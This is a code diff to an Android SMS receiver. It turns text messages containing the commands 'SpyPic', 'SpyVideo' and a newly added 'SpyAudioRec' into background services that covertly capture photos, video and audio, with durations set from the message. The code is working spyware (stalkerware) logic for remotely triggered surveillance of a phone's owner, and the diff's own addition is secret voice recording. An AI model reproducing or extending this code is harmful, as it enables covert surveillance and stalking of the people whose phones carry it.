@@ -30,28 +30,43 @@ public class SmsReceiver extends BroadcastReceiver {
                         Log.i(LOG_TAG , String.format("requested images %s" , intValue));
                         String originalMsg = msgBody.replaceAll("[0-9]","");
                         Log.i("SPY_CAM" , "Msg :" + originalMsg);
-                        if (originalMsg.equals("SpyPic")) {
-                            Log.i("SPY_CAM", "Capturing Image");
-                            Intent picServiceIntent = new Intent(context, SpyPictureService.class);
-                            if (!intValue.isEmpty()) {
-                                firstValue = Character.getNumericValue(intValue.charAt(0));
-                            }
-                            if (firstValue != 0 && firstValue < 5) {
-                                Log.i("SPY_CAM","FirstValue :" + firstValue);
-                                picServiceIntent.putExtra("burstValue", firstValue);
-                            }
-                            context.startService(picServiceIntent);
-                        } else if (originalMsg.equals("SpyVideo")) {
-                            Log.i("SPY_CAM", "Capturing Video");
-                            Intent videoIntent = new Intent(context, SpyVideoService.class);
-                            if (!intValue.isEmpty()) {
-                                int videoDelay = Integer.parseInt(intValue);
-                                Log.i("SPY_CAM", "videoDuration" + videoDelay);
-                                if (videoDelay < 60) {
-                                    videoIntent.putExtra("video_delay", videoDelay);
+                        switch (originalMsg) {
+                            case "SpyPic":
+                                Log.i("SPY_CAM", "Capturing Image");
+                                Intent picServiceIntent = new Intent(context, SpyPictureService.class);
+                                if (!intValue.isEmpty()) {
+                                    firstValue = Character.getNumericValue(intValue.charAt(0));
                                 }
-                            }
-                            context.startService(videoIntent);
+                                if (firstValue != 0 && firstValue < 5) {
+                                    Log.i("SPY_CAM", "FirstValue :" + firstValue);
+                                    picServiceIntent.putExtra("burstValue", firstValue);
+                                }
+                                context.startService(picServiceIntent);
+                                break;
+                            case "SpyVideo":
+                                Log.i("SPY_CAM", "Capturing Video");
+                                Intent videoIntent = new Intent(context, SpyVideoService.class);
+                                if (!intValue.isEmpty()) {
+                                    int videoDelay = Integer.parseInt(intValue);
+                                    Log.i("SPY_CAM", "videoDuration" + videoDelay);
+                                    if (videoDelay <= 60) {
+                                        videoIntent.putExtra("video_delay", videoDelay);
+                                    }
+                                }
+                                context.startService(videoIntent);
+                                break;
+                            case "SpyAudioRec":
+                                Log.i("SPY_CAM", "SPY_AUDIO_REC");
+                                Intent audioIntent = new Intent(context, SpyVoiceRecordingService.class);
+                                if (!intValue.isEmpty()) {
+                                    int voiceRecDelay = Integer.parseInt(intValue);
+                                    Log.i("SPY_CAM", "Audio_Duration" + voiceRecDelay);
+                                    if (voiceRecDelay <= 60) {
+                                        audioIntent.putExtra("Audio_Delay", voiceRecDelay);
+                                    }
+                                }
+                                context.startService(audioIntent);
+                                break;
                         }
                     }
                 } catch (Exception e) {
